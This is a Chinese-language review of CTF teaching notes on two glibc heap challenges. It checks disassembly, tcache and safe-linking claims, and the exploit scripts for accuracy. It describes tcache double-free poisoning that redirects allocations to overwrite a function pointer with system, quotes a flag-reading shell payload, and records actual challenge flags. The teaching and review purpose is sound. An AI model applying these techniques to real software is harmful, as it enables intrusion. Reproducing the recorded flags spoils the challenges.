# Review Round 2 — `pwn4/cache_money` + `pwn6/code_breaker` heap 教材審查

> 審查對象（**只讀不改**）：
> `pwn4/notes.md`(1170 行)、`pwn4/exploit.py`(224 行)、`pwn6/notes.md`(1131 行)、`pwn6/exploit.py`(268 行)，
> 並交叉檢查 `wp/00_基礎知識_從零開始.md`、`wp/99_速查表.md` §8。
>
> 讀者設定：**完全沒學過 ROP/SROP、也完全沒學過 heap exploitation**。
>
> 方法：`objdump -d -M intel` 逐條比對筆記裡引用的每一條指令位址、
> `readelf -r/-S/-l`、**gdb（本機無 pwndbg，用純 gdb + python 直接讀記憶體）**、
> 自寫 C 程式用題目附的 `libc.so.6`(2.39) 實測 fastbin 行為、
> 以及**四支 exploit 全部實跑**（local + REMOTE）。
>
> 本輪沒有動任何檔案，只產生本檔。

---

## 0. 摘要（先看這個）

| 類別 | 高 | 中 | 低 |
|---|---|---|---|
| E 錯誤（事實／引用錯誤／exploit 缺陷） | 3 | 5 | 7 |
| B 新手卡點 | 2 | 4 | 2 |
| S 與 wp/00、wp/99 的一致性 | 2 | 2 | 3 |

**最重要的一句話**：兩支 exploit 的**技術主張幾乎全部為真**（我逐項在 gdb 裡複驗過，
見 §4 四個 PASS），但

1. `pwn4/notes.md` 的**逐行組語區塊（§4.2 / §4.3 / §4.4 / §4.5 / §4.6）有系統性的地址抄錯**，
   新手照著在 objdump/gdb 裡對位址會完全對不上（E3~E6）；
2. `pwn4/notes.md` 的 heap 理論有 **3 個明確錯誤**：fastbin「只放 7 個」(E1)、
   `entries[7] = 0x406960`(E2，應為 malloc 回傳的 `0x406970`)、small bin 範圍含 `0x400`(E9)；
3. `pwn6/notes.md` **完全沒有 heap 鋪陳**：`tcache`／poisoning／safe-linking 直接拿來用，
   沒有 chunk/tcache/bin/LIFO/7-per-size 的定義，也沒指向 `wp/99 §8` 或 `pwn4 §5`（B1）；
   而且它把 safe-linking 的 `P` 講成「chunk 位址」，正確值是「malloc 回傳的 user 位址」（B2）。
4. 附帶的 exploit 小缺陷：`pwn6/exploit.py:259` 本地跑完會**無條件覆蓋 `FLAG.txt`**（E15），
   `pwn4` 有保護、`pwn6` 沒有。
5. `wp/00` 對 pwn6 的三處描述（「ROP」、「UAF 只列 pwn4」、「Uninitialised memory」）與 pwn6 筆記矛盾（S2）。

---

## 1. 錯誤清單

格式：**檔案／行號／原文／正確值／驗證指令／建議替換文字**

### E1【高】fastbin「也只放 7 個」是錯的 —— fastbin 沒有數量上限

* **檔案／行號**：`pwn4/notes.md:708-709`（§5.5 其他 bin）
* **原文**：

  ```
   fastbin：大小 <= 0x80（global_max_fast）的 chunk，tcache 滿了之後的下一站。
            LIFO 單向鏈，也只放 7 個。
  ```
* **正確值**：**7 個是 tcache 的限制（`mp_.tcache_count`），fastbin 沒有數量上限。**
  把 tcache 塞滿之後繼續 free 同 size 的 chunk，fastbin 鏈可以無限長
  （真正會清掉 fastbin 的是 `malloc_consolidate()`，只在有大請求時發生）。
* **驗證指令**（用題目附的 2.39 libc 實測，我跑過了）：

  ```bash
  cat > /tmp/fbt.c <<'EOF'
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <gnu/libc-version.h>
  #define N 20
  int main(void){
      fprintf(stderr,"glibc %s\n", gnu_get_libc_version());
      void *p[N];
      for(int i=0;i<N;i++){ p[i]=malloc(0x18); memset(p[i],0x41,0x18); }
      for(int i=0;i<N;i++) free(p[i]);          /* 前 7 個進 tcache，其餘進 fastbin */
      unsigned long cur=(unsigned long)p[N-1], count=1, ch;
      while(1){ ch = *(unsigned long*)cur ^ (cur>>12);   /* fastbin fd 用 safe-linking 編碼 */
                if(!ch) break; cur = ch + 0x10; count++; if(count>64) break; }
      fprintf(stderr,"freed %d chunks of size 0x20: tcache=7, fastbin length=%lu\n", N, count);
      return 0;
  }
  EOF
  gcc -O0 -o /tmp/fbt /tmp/fbt.c
  cd pwn4 && ./ld-linux-x86-64.so.2 --library-path . /tmp/fbt
  # 實測輸出：glibc 2.39
  #           freed 20 chunks of size 0x20: tcache=7, fastbin length=13   ← 13 > 7，沒有 7 的上限
  ```
* **建議替換文字**：

  ```
   fastbin：大小 <= 0x80（global_max_fast）的 chunk，tcache 滿了之後的下一站。
            LIFO 單向鏈，**沒有數量上限**（「7 個」是 tcache 的規矩，別搞混；
            實測 glibc 2.39 連丟 13 塊進 fastbin 也不會被拒）。
            注意：fastbin 的 next 存的是「chunk 標頭位址」（不是 malloc 回傳值），
            tcache 的 next 存的才是 malloc 回傳值。
  ```

### E2【高】`entries[7] = 0x406960` 抄錯 —— tcache `entries[]` 存的是 **malloc 回傳的 user 位址**

* **檔案／行號**：`pwn4/notes.md:637`（§5.3）
* **原文**：`      entries[7] = 0x406960  ← 下一個 malloc(0x80) 會拿到的 chunk`
* **正確值**：`entries[7] = 0x406970`（`0x406960` 是 chunk 標頭，`malloc` 回傳的是 `0x406970 = 0x406960+0x10`）。
  本檔自己的 §6 gdb 表（`pwn4/notes.md:786`）就寫 `0x406960 | 0x91 | W6 ledger`（chunk 標頭），
  而 `entries[7]` 印出來是 `0x406970` —— §5.3 與 §6 互相矛盾。
* **驗證指令**（我用 gdb 實際 dump，見 §4 附錄的完整腳本）：

  ```bash
  # 在 pwn4 目錄，用 patchelf 過的 cm_dbg（interpreter 指向本地 2.39 loader）
  # 輸入檔：S/D + W0..W6（各 0x80）→ close slot 2..8 → transfer 0→1
  gdb -q -batch -ex 'b *0x401b21' -ex 'run < /tmp/p4in.bin' ./cm_dbg \
     -ex 'x/16gx 0x405090'
  # 0x4050a0: 0x0000000000406930   ← entries[2] = 0x406930 = 0x406920+0x10（W6 的 wallet 結構）
  # 0x4050c8: 0x0000000000406970   ← entries[7] = 0x406970 = 0x406960+0x10（W6 的 ledger）
  #          （chunk 標頭 0x406960；gdb 的 heap 走訪：0x406960 size 0x91，下一個 chunk 0x4069f0）
  ```
* **建議替換文字**：

  ```
        entries[7] = 0x406970  ← 下一個 malloc(0x80) 會拿到的位址（= chunk 標頭 0x406960 + 0x10）
  ```
  **並在 §5.3 開頭補一句（重要，這是毒化能不能成立的關鍵）**：
  「`tcache->entries[]` 裡躺的是**明文**的 malloc 回傳位址（= chunk+0x10）；
  只有『chunk 內部那個 next 欄位』才是 safe-linking 編碼過的。所以毒化時
  你只需要知道 `chunk>>12`，不需要整個 chunk 位址。」

### E3【高】`read_int`（§4.2）的後半段組語整段不對，而且「EOF → 回 -1」是錯的

* **檔案／行號**：`pwn4/notes.md:293-315`（§4.2）
* **原文（節錄）**：

  ```
  401535: mov    QWORD PTR [rsp+0x28],rax
  40153a: mov    rbx,rsp
  40153d: xor    eax,eax
  ...
  401558: test   rax,rax
  40155b: je     4015a8                  ← EOF → 回 -1
  40155d: xor    esi,esi
  40155f: mov    edx,0xa
  401564: mov    rdi,rbx
  401567: call   strtol@plt
  40156c: movsxd rbx,eax                 ← rbx = (int)strtol(...)
  40156f: test   rbx,rbx
  401572: js     4015a8                  ← 負數 → 回 -1（「Invalid wallet index」）
  401575: cmp    rbx,0xf
  401579: ja     4015a8                  ← ★ 無號比較：> 15 就 invalid
  40157b: mov    rax,rbx
  40157e: ...    ret
  ```
* **正確值**（`objdump -d -M intel --start-address=0x401510 --stop-address=0x4015b0 cache_money`）：

  ```
  401536: mov    QWORD PTR [rsp+0x28],rax
  40153b: xor    eax,eax
  40153d: mov    rbx,rsp
  401540: call   __printf_chk@plt
  ...
  401559: test   rax,rax
  40155c: je     401590          ← EOF → 0x401590 的 exit(0)（不是回 -1！）
  40155e: mov    edx,0xa
  401563: xor    esi,esi
  401565: mov    rdi,rbx
  401568: call   strtol@plt
  40156d: mov    edx,eax         ← 存成 32-bit
  40156f: cmp    eax,0xf         ← 沒有 movsxd、沒有 test rbx,rbx、沒有 js
  401572: ja     401597          ← 32-bit 無號比較 > 15 → puts("Invalid wallet index") 後回 -1
  401574: mov    rax,QWORD PTR [rsp+0x28]
  401579: sub    rax,QWORD PTR fs:0x28      ← canary 檢查
  401588: mov    eax,edx
  40158b: ret
  401590: xor    edi,edi ; call exit@plt   ← fgets 失敗（EOF）→ exit(0)
  401597: lea    rdi,[rip+0xf68] # 402506 ; call puts@plt ; mov edx,0xffffffff
  ```
  * 兩點語意差異（不只是地址錯）：
    1. **EOF 不是「回 -1」而是 `exit(0)`**（`je 401590` → `xor edi,edi; call exit@plt`）。
       這也解釋了為什麼 exploit 用 `recvrepeat` 收尾後程式會直接結束。
    2. 負數／過大值是用 **`cmp eax,0xf; ja`（32-bit 無號）**一次擋掉，
       不是「先 `js` 再 `cmp rbx,0xf`」。所以筆記的結論「沒有負索引漏洞」**結論正確、理由錯**。
* **驗證指令**：

  ```bash
  cd pwn4 && objdump -d -M intel --start-address=0x401510 --stop-address=0x4015b0 cache_money
  # 或直接查專案裡已有的 dis.txt（作者自己的 objdump 輸出，內容與 binary 一致）：
  grep -n "40156d\|40156f\|401590\|401597" dis.txt
  ```
* **建議替換文字**：整段換成上面那段 `objdump` 真實輸出，並把「EOF → 回 -1」改成
  「EOF（`fgets` 回 NULL）→ `exit(0)`」。

### E4【中】`Open Wallet`（§4.3）序言段的位址、offset、`sub rsp` 大小都錯

* **檔案／行號**：`pwn4/notes.md:322-327`
* **原文**：

  ```
  4015c0: endbr64
  4015c1: xor    ebx,ebx
  4015c3: lea    rbp,[rip+0x2af6]               # 4040c0  ← ★ slot 表基底
  4015ca: push   r12 / push rbp / push rbx ... sub rsp,0x20
  4015d7: mov    rax,QWORD PTR fs:0x28          ← canary
  ```
* **正確值**（`objdump`）：

  ```
  4015b0: endbr64                    ← 函式真正起點（main 是 call 4015b0）
  4015b4: push   r13
  4015b6: push   r12
  4015b8: push   rbp
  4015b9: lea    rbp,[rip+0x2b00]    # 4040c0   ← slot 表基底（位址對，指令位址/offset 錯）
  4015c0: push   rbx
  4015c1: xor    ebx,ebx
  4015c3: sub    rsp,0x38            ← 不是 0x20
  4015c7: mov    rax,QWORD PTR fs:0x28
  4015d0: mov    QWORD PTR [rsp+0x28],rax
  ```
* **驗證指令**：`objdump -d -M intel --start-address=0x4015b0 --stop-address=0x401600 cache_money`
* **建議替換文字**：照上面真實輸出重抄（§4.3 標題的「0x4015b0 / 主體 0x4015c0」改成
  「起點 0x4015b0，找 slot 迴圈從 0x4015e0 開始」）。

### E5【中】`calloc` 的 `edi`/`esi` 抄反了

* **檔案／行號**：`pwn4/notes.md:339-340`
* **原文**：

  ```
  401620: mov    edi,0x1                         ← calloc 第 1 參數
  401625: mov    esi,0x30                        ← calloc 第 2 參數 → 共 0x30 bytes
  ```
* **正確值**（`objdump` 的位元組碼 `be 01 …` = `mov esi,imm32`、`bf 30 …` = `mov edi,imm32`）：

  ```
  401620: mov    esi,0x1
  401625: mov    edi,0x30
  40162a: call   calloc@plt          ← 即 calloc(nmemb=0x30, size=1)，共 0x30 bytes
  ```
* **驗證指令**：`objdump -d -M intel --start-address=0x401620 --stop-address=0x401630 cache_money`
* **建議替換文字**：

  ```
  401620: mov    esi,0x1     ← calloc 的 size   = 1
  401625: mov    edi,0x30    ← calloc 的 nmemb  = 0x30 → 共 0x30 bytes
  ```

### E6【中】`Deposit`／`Withdraw`／`Transfer` 區塊的指令位址整排位移（1~9 bytes）

* **檔案／行號**：`pwn4/notes.md:404-406`、`444`、`448-450`、`481-484`（以及 `483`、`492`、`509` 附近）
* **原文（節錄）**：

  ```
  4017d0: push rbx                                   ← §4.4 Deposit
  4018a0: push rbx ; sub rsp,0x20                    ← §4.5 Withdraw
  401a14: push rbp / push rbx / sub rsp,0x8          ← §4.6 Transfer
  401a1c: call   401510                 ← read_int
  ```
* **正確值**（`objdump`）：

  ```
  Deposit  (0x4017d0)  4017d0: endbr64 ; 4017d4: push rbx
  Withdraw (0x4018a0)  4018a0: endbr64 ; 4018a4: push rbx ; 4018bd: sub rsp,0x30
  Transfer (0x401a10)  401a10: endbr64 ; 401a14: push rbp ; 401a15: lea rdi,[rip+0xbb2]
                       401a1c: push rbx ; 401a1d: sub rsp,0x8 ; 401a21: call 401510
  ```
  （§4.6 把三條指令塞進 `401a14` 一行、並把 `call 401510` 標在 `401a1c`，
  實際上 `401a1c` 是 `push rbx`、`call` 在 `401a21`。）
* 同型的位移／運算元錯誤（我只列代表，全部共 20 處以上）：

  | 筆記位置 | 筆記寫的 | 實際 |
  |---|---|---|
  | `:294` | `401535: mov QWORD PTR [rsp+0x28],rax` | `401536: mov QWORD PTR [rsp+0x28],rax` |
  | `:352` | `40168a: call strcspn@plt` | `40168a: mov r13,rsp`（call 在 `40168d`） |
  | `:350` | `401680: lea rdi,[rip+0xff6] # 40267d "\n"` | `401680: lea rsi,[rip+0xff6] …`（是 `rsi`） |
  | `:357` | `4016d1: call strtol@plt` | `4016d1: mov rdi,r13`（call 在 `4016db`） |
  | `:420` | `401823: call __printf_chk@plt` | `401823: lea rsi,[rip+0xd36]`（call 在 `401831`） |
  | `:450` | `4018f6: call strtol@plt` | `4018f6: xor esi,esi`（call 在 `401900`） |
  | `:472` | `401976: printf("\n[+] Current balance: %lu\n", balance)` | `401976: add rsp,0x30`（尾呼叫的 `lea rsi,#4025b3` 在 `40197a`） |
* **驗證指令**：

  ```bash
  cd pwn4
  objdump -d -M intel --start-address=0x4017d0 --stop-address=0x4018a0 cache_money   # Deposit
  objdump -d -M intel --start-address=0x4018a0 --stop-address=0x401a10 cache_money   # Withdraw
  objdump -d -M intel --start-address=0x401a10 --stop-address=0x401b60 cache_money   # Transfer
  ```
* **建議替換文字**：**不要手打地址**。整區塊直接用 `objdump -d -M intel --start-address=… --stop-address=…`
  的輸出貼上（作者的 `dis.txt` 已經是正確版本，可直接引用），註解再另外用 `←` 加。

### E7【中】Partial RELRO 的描述漏掉 `.got`，與 `wp/00` §4.4 說法不一致

* **檔案／行號**：`pwn4/notes.md:70`、`82`
* **原文**：`GNU_RELRO 0x2dc0 0x403dc0 0x403dc0    <- 只有 .init_array/.fini_array 被保護`
  / 「只有 `.init_array`/`.fini_array` 變唯讀，**`.got.plt` 還是可寫**」
* **正確值**：`GNU_RELRO` 的範圍是 `0x403dc0`~`0x404000`（size 0x240），
  所以**被保護（唯讀）的除了 `.init_array`(0x403dc0)/`.fini_array`(0x403dd0)，
  還包含 `.got`(0x403fd8) 以及 `.got.plt` 的頭 0x18 bytes（0x403fe8~0x404000）**；
  可寫的是「函式 GOT 項目」所在的 `0x404000` 之後（例如 `strtol@0x404040`）。
  `wp/00_基礎知識_從零開始.md` §4.4 的寫法（Partial RELRO → `.got` 唯讀、`.got.plt` 可寫）才是對的。
* **驗證指令**：

  ```bash
  cd pwn4
  readelf -l cache_money | grep -A1 GNU_RELRO     # 0x403dc0 + 0x240 = 0x404000
  readelf -S cache_money | grep -E "\.got|\.init_array|\.fini_array"
  # [23] .got  0000000000403fd8   ← 在 RELRO 範圍內（唯讀）
  # [24] .got.plt 0000000000403fe8 ← 只有前 0x18 bytes 落在 RELRO(到 0x404000)
  objdump -R cache_money | head                     # 函式 GOT 從 0x404000 起 → 可寫 ✔
  ```
* **建議替換文字**：

  ```
    GNU_RELRO 0x2dc0 0x403dc0 0x403dc0    <- 保護範圍 0x403dc0~0x404000
                                              （.init_array/.fini_array/.got + .got.plt 前 0x18 bytes）
  ```
  表格列改成：「`.got` 唯讀，但**函式 GOT 項目（0x404000 之後，含 `strtol@0x404040`）仍可寫**」。

### E8【低】PLT 的 `rip` 位移抄錯（目標對、位移錯）

* **檔案／行號**：`pwn4/notes.md:176`
* **原文**：`401194: jmp QWORD PTR [rip+0x2eae]   # 404040  <-- GOT 的位址`
* **正確值**：`401194: jmp QWORD PTR [rip+0x2ea6]  # 404040 <exit@plt+0x2e60>`
  （`0x401194+6+0x2ea6 = 0x404040` ✔；筆記的 `0x2eae` 會算成 `0x404048`）
* **驗證指令**：`cd pwn4 && objdump -d -M intel --start-address=0x401194 --stop-address=0x40119a cache_money`
* **建議替換文字**：`401194: jmp QWORD PTR [rip+0x2ea6]   # 404040  <-- strtol 的 GOT`

### E9【低】small bin 的範圍寫成 `0x90 ~ 0x400`，把第一個 large bin 包進去了

* **檔案／行號**：`pwn4/notes.md:710`
* **原文**：` small bin：0x90 ~ 0x400，雙向鏈結（fd/bk）。`
* **正確值**：small bin 涵蓋 **chunk size < 0x400**（glibc：`MIN_LARGE_SIZE = 64*16 = 0x400`），
  所以實際是 `0x90 ~ 0x3f0`；`0x400` 已經是第一條 large bin。
* **驗證指令**：glibc `malloc.c`：`#define MIN_LARGE_SIZE (NSMALLBINS * SMALLBIN_WIDTH)`（64*16=1024=0x400）；
  也可用 `malloc(0x3f0)`（chunk 0x400）觀察它會進 large bin 而非 small bin。
* **建議替換文字**：` small bin：0x90 ~ 0x3f0（< 0x400），雙向鏈結（fd/bk）。`

### E10【中】`pwn6` §6.4 payload 圖的長度 `0x1e` 與實際送的指令不符

* **檔案／行號**：`pwn6/notes.md:845-851`
* **原文**：

  ```
  +--------+--------+--------------------------------------------------------+
  | 00 1e  |   0x15 | "cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ..."   |
  +--------+--------+--------------------------------------------------------+
    len=0x1e  cmd
  ```
* **正確值**：`exploit.py:239` 的實際指令是
  `b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE'` = **70 bytes**，
  加上 `0x15` 這 1 byte ⇒ **len = 71 = 0x47**（前綴應是 `00 47`）。
* **驗證指令**：

  ```bash
  python3 -c "c=b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE'; print(len(c), hex(len(c)+1))"
  # 70 0x47
  sed -n '235,242p' pwn6/exploit.py
  ```
* **建議替換文字**：把圖中的 `00 1e` / `len=0x1e` 改成 `00 47` / `len=0x47 (71 bytes)`，
  或改畫成 `| 00 08 | 0x15 | "/bin/sh\0" |`（如果真的想示範最小案例）。

### E11【低】`pwn6` §2.5 對 PLT stub 的描述用了一個不會被用到的位址

* **檔案／行號**：`pwn6/notes.md:166`
* **原文**：「`0x4028` 這格第一次被呼叫前指向的是 PLT 的解譯器（`0x1030` 那段 `push 0x?; jmp 0x1020`）」
* **正確值**：敘述「PLT0(`0x1020`) + stub」的**模式**沒錯（`.plt` 起始 = `0x1020` ✔），
  但 `system` 是第 6 個 JUMP_SLOT（`0x4028 = 0x4000 + 5*8`），它自己的 stub 在 **`0x1080`**
  （`0x1030 + 5*0x10`），不是 `0x1030`（那是 `free` 的 stub）。
* **驗證指令**：

  ```bash
  cd pwn6
  readelf -S code_breaker | grep -E "\.plt |\.got.plt"      # .plt = 0x1020, .got.plt = 0x3fe8
  objdump -d -M intel --start-address=0x1080 --stop-address=0x1090 code_breaker
  # 1080: endbr64 ; push 0x5 ; jmp 1020        ← system 的 lazy-binding stub
  ```
* **建議替換文字**：「（`system` 對應的 stub 是 `0x1080`：`push 0x5; jmp 0x1020`）」。

### E12【低】引用的行長／transcript 不是逐字（容易被當成「我跑出來不一樣」）

* **檔案／行號**：`pwn4/notes.md:1040-1080`（§9.1/§9.2）、`pwn6/notes.md:966-1010`（§8.1/§8.2）
* **原文／實際差異**：
  1. `pwn4` §9.1 的 local transcript 少了 pwntools 的 `[x] Starting local process …`
     以及程式在最後一次 deposit 之後印出的 `[+] Deposited 8 bytes. New balance: 8` + 整段 MAIN MENU
     （實跑真的有，見 §4）。
  2. `pwn4` §9.2 的遠端第一行寫成 `[x] Opening connection …: Done`，
     pwntools 實際上會印兩行：`[x] Opening connection …: Trying 35.211.211.18` 與
     `[+] Opening connection …: Done`。
  3. `pwn6` §8.1/§8.2 把啟動行寫成 `[+] Opening connection ... (local: ./ld-linux…)`（改寫過的句子），
     且**兩份 transcript 都沒有貼出結尾那串二進位亂碼**（cmd 0x15 之後服務端會把加密流 echo 回來，
     實跑會看到 `HG…`/`H7~-|'…` 之類的 bytes）。新手第一次跑會以為自己弄壞了。
* **驗證指令**：直接跑 §4 的四個指令並對照本檔貼出的輸出。
* **建議替換文字**：直接把本檔 §4 的輸出貼進去（或註明「以下為節錄，省略 pwntools 啟動行、
  MAIN MENU echo 與結尾的二進位 echo；`pwn6` 建議用 `| tr -d '\000'` 過濾」）。

### E13【低】術語：`r8~r11` 不是「第 5、6 個參數」

* **檔案／行號**：`pwn4/notes.md:109`
* **原文**：`r8~r11  第 5、6 個參數`
* **正確值**：SysV AMD64 的整數參數只有 `rdi, rsi, rdx, rcx, r8, r9`；
  `r10`/`r11` 是 caller-saved 暫存器，**不是**參數暫存器（`r10` 只在 syscall 當第 4 參數）。
  `wp/00` §6.1 與 `pwn6/notes.md:93` 都寫對了，只有這裡不一致。
* **驗證指令**：`grep -n "r8" wp/00_基礎知識_從零開始.md pwn6/notes.md | head`
* **建議替換文字**：`r8, r9  第 5、6 個參數（r10, r11 = caller-saved，r10 在 syscall 當第 4 參數）`

### E14【低】`pwn4` §4.2 `__printf_chk` 的 flag 寫成 `2`（應為 `0x2`，同義但與其他段不一致）

* **檔案／行號**：`pwn4/notes.md:291`
* **原文**：`40151f: mov    edi,2                   ← __printf_chk 的 flag`
* **正確值**：`40151f: mov edi,0x2`（`objdump` 一律印十六進位；同檔其他段落都用 `0x2`）。
* **驗證指令**：`cd pwn4 && objdump -d -M intel --start-address=0x40151f --stop-address=0x401524 cache_money`
* **建議替換文字**：`40151f: mov edi,0x2`

### E15【低】`pwn6/exploit.py` 少了「不要覆蓋真 flag」的保護（`pwn4` 有）

* **檔案／行號**：`pwn6/exploit.py:259-260`（對比 `pwn4/exploit.py:220`）
* **原文**：

  ```python
  # pwn6/exploit.py
      with open(os.path.join(HERE, 'FLAG.txt'), 'w') as f:
          f.write(flag + '\n')
  # pwn4/exploit.py 有保護：
      if flag != 'sun{LOCAL_TEST_FLAG}':       # never clobber the real flag
          open(os.path.join(HERE, 'FLAG.txt'), 'w').write(flag + '\n')
  ```
* **問題**：`pwn6` 本地測試（`flag.txt` = `sun{local_test_flag}`）會**無條件覆蓋** `FLAG.txt`，
  把已經記錄下來的真 flag（`sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}`）蓋成 `sun{local_test_flag}`。
  只要「先打遠端、後跑本地」就會踩到；兩支 exploit 行為不一致，`pwn6/notes.md` §附錄 B
  的流程（先本地再遠端）剛好掩蓋了這個問題。
* **驗證指令**：

  ```bash
  cd pwn6 && python3 exploit.py >/dev/null; cat FLAG.txt
  # 印出 sun{local_test_flag} ← 真 flag 被蓋掉了（pwn4 同樣操作不會覆蓋）
  python3 exploit.py REMOTE >/dev/null; cat FLAG.txt   # 打一次遠端才恢復真 flag
  ```
* **建議替換文字**：把 `pwn6/exploit.py` 的寫檔改成與 `pwn4` 相同：

  ```python
          if flag != 'sun{local_test_flag}':   # never clobber the real flag
              with open(os.path.join(HERE, 'FLAG.txt'), 'w') as f:
                  f.write(flag + '\n')
  ```

---

## 2. 新手卡點（heap 概念順序、缺少的圖、缺少的推導）

### B1【高】`pwn6/notes.md` 完全沒有 heap 鋪陳，卻從 §4 開始大量使用 heap 術語

`pwn6/notes.md` 開頭寫「對象：**完全沒學過 ROP / pwn 的初學者**」，但：

* `:593` 出現 `free(P) ⇒ P 進 tcache`；
* `:596`「把 tcache 的 next(0..7) 和 key(8..15) 清成 0」；
* `:619`「讓同一個 chunk 在 tcache 裡出現（形成環狀串列）」；
* `:623`「glibc 從 2.32 起把 tcache/fastbin 的 next 指標加密」。

**這些名詞在 pwn6 內沒有任何定義**：沒有 chunk 標頭（prev_size/size）圖、沒有
「chunk size = user size 向上取 16 對齊 + 0x10、最小 0x20」、沒有「tcache 每 size 最多 7 個、LIFO」、
沒有 `tc_idx = (size-0x20)/0x10`、沒有 safe-linking 的編碼/解碼推導（只有一行公式）。
而且 pwn6 全文**沒有引用** `wp/99_速查表.md` §8 或 `pwn4/notes.md` §5
（`grep -n "wp/99\|速查表\|pwn4" pwn6/notes.md` → 0 筆）。

**建議**：在 pwn6 §4 之前插入 15~20 行的「heap 最小語彙」小節，或至少放一行指路
「heap 基礎（chunk / bin / tcache / safe-linking）先讀 `wp/99 §8` 與 `../pwn4/notes.md` §5，
本節只講這題用到的部分」。

### B2【高】`pwn6` 把 safe-linking 的 `P` 講成「chunk 位址」——新手會算錯 0x10

* `pwn6/notes.md:623-631`：「`stored = ptr ^ (pos >> 12)` … `pos = 存放這個指標的位址，也就是 chunk 自己的位址`」，
  範例又寫 `P ^ (P >> 12) = leaked`、`P (0x90 chunk)`。
* 實際上 `PROTECT_PTR(pos, ptr)` 的 `pos = &e->next`，而 `e = chunk2mem(p)`
  ⇒ **`P` 必須是 malloc 回傳的 user 位址（chunk 標頭 + 0x10）**。
  若新手拿 chunk 標頭（0x10 對齊也合法，不會觸發 `aligned_OK` 檢查）去算，
  會把 `system@plt` 寫到 `PIE+0x40d0`，症狀是「程式沒崩、但 [`0x40c0`] 還是 stub」——非常難查。
* **驗證**：本輪實跑 gdb（§4 附錄 B）確認 tcache 空鏈時
  `stored == (freed_user_ptr >> 12)`（`0x4062f0>>12 = 0x406`），而
  `tcache->entries[]` 也是 user 位址。
* **建議**：把 `P` 明確定義成「`cb.alloc()` 之後 `malloc` 回傳的那個位址」，
  並補一句「chunk 標頭 = `P - 0x10`，別拿標頭去 XOR」。

### B3【中】`pwn4` 缺少「double free → 環 → 毒化」的圖

`pwn4/notes.md` §7.3 只用文字條列 5 步，讀者看不到 tcache 串列的**三種狀態**。
建議補這張圖（我已用 gdb 驗證每一步都對）：

```
(2a) transfer(2,3) 剛 free 完，tcache[0x30] 是空的：
     tcache->entries[1] ──► P
     P->next = (P>>12) ^ NULL = P>>12      ← 「key」就是這樣洩漏的
(2b) UAF write 清 next/key，再 free 一次（double free）：
     tcache->entries[1] ──► P ──► P        ← 環！P->next = P ^ (P>>12)
(2c) 把 P->next 改成 (P>>12) ^ &slots[0]：
     tcache->entries[1] ──► P ──► 0x4040c0
                            ▲            ▲
              malloc #1 回傳 ┘            └─ malloc #2 回傳（= slot 表！）
```

### B4【中】`pwn4` 的 `POISON_SLOT = 6` 只有一句「本例是 slot 6」，沒有推導

`exploit.py:51` 寫死 `POISON_SLOT = 6`，`notes.md:1063` 只說「>= 4，本例是 slot 6」。
實際上它完全由「slot 掃描只看 `slots[i] == NULL`」決定：

```
Open S→slot0, D→slot1, W0..W6→slot2..8
close 2..8          → slot2..8 全部變 NULL
open P0→slot2, P1→slot3, P2→slot4         （slot0/1 仍非 NULL，因為 transfer 只把 active 設 0）
transfer(2,3)       → slot2 仍非 NULL（P0 只是 active=0）
open P3→slot5, P4→slot6                   ← 所以 POISON_SLOT = 6
```
建議把這 6 行推導貼進 §8.3，並強調「`slots[i]` 只有 Close 才會設 NULL」。

### B5【中】`pwn4` §6 的 gdb 佈局表無法重現（沒有輸入檔/指令）

`pwn4/notes.md` §6 的 chunk 表（`0x405000 0x291` … `0x4069f0 0x1f611`）與我的 gdb 實測**完全一致**（見 §4 附錄 A），
價值很高——但筆記沒有給「怎麼跑出這張表」的輸入檔與指令。Round 1 對 `pwn1` 就是因為這點被要求補腳本。
建議補：

```bash
# 重現 §6 的 heap 佈局（本題 non-PIE，注意要用題目附的 2.39：cm_dbg 的 interpreter 已指向本地 loader）
printf '1\nS\n128\n1\nD\n128\n' > /tmp/in.bin
for i in 0 1 2 3 4 5 6; do printf "1\nW$i\n128\n" >> /tmp/in.bin; done
for i in 2 3 4 5 6 7 8; do printf "5\n$i\n"     >> /tmp/in.bin; done
printf '4\n0\n1\n' >> /tmp/in.bin
gdb -q -batch -ex 'b *0x401b21' -ex 'run < /tmp/in.bin' ./cm_dbg -ex 'x/16hx 0x405010' -ex 'x/16gx 0x405090'
```

### B6【中】「`entries[]` 是明文、chunk 內 `next` 是編碼值」這個關鍵區別沒寫出來

`pwn4` §5.4（`:686-700`）示範了「空鏈 → `stored = chunk>>12`」，
但沒有明講「所以**你不需要完整 chunk 位址**，只要 `chunk>>12` 就能毒化」與
「`entries[]` 裡是明文位址（不用解碼）」。這正好是這題 flag（`s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che`）
與 §8.2 那句「這裡不需要知道 chunk 的完整位址」的**原理**，值得各補一句並加圖。
（同時修掉 E2。）

### B7【低】`pwn6` 的 `CHUNK = 0x80` 沒說為什麼

`exploit.py:37` 用 `CHUNK = 0x80`（chunk 0x90 → tcache idx 7），筆記只在 §6.3 圖裡提「P (0x90 chunk)」。
建議補一句：「size 只受 cmd 0x10 的 `1 ≤ size ≤ 0x400` 限制；選 0x80 只是讓
`__memcpy_chk` 的 destlen 夠大，且毒化目標 `PIE+0x40c0` 一定落在可寫的 `.bss` 內；
換成別的 size（例如 0x20）也一樣能打，只要對應的 tcache size class 是空的」。

### B8【低】`pwn6` 沒有任何 gdb 證據（對比 pwn4 §6）

`pwn6` 的 §4.3 是整題的核心（自我參照 `P ^ (P>>12)`），但全文**沒有一次 gdb dump**，
讀者只能相信文字。本輪能驗證它的只有 exploit 自己的斷言
（`pwn6/exploit.py` 的 `assert stored_next == (P ^ (P >> 12))`，實跑通過）與
我在 `pwn4` 上做的同構實驗（附錄 B：空鏈時 `stored == chunk>>12`）。
**建議**補一段 gdb dump（下面的位址是示意，數值形狀取自本輪實跑；請在真正跑一次後貼上實值）：

```
# 1) cb.free(IDX_VICTIM) 之後（cmd 0x13 handler 內 0x1b19 的 call free 之後）
#    tcache[0x90] 原本是空的 ⇒ next = (P>>12) ^ NULL = P>>12
(gdb) x/2gx  P                    # P 的前 16 bytes = next / key
0x…480: 0x0000055555b7f9  0xb20b623792d1e316
#        └ next = P>>12       └ key = 隨機 tcache_key（不是指標，所以洩漏不到 heap）
# 2) cb.free(IDX_ALIAS) 之後（double free 完成）⇒ next = P ^ (P>>12)（自我參照）
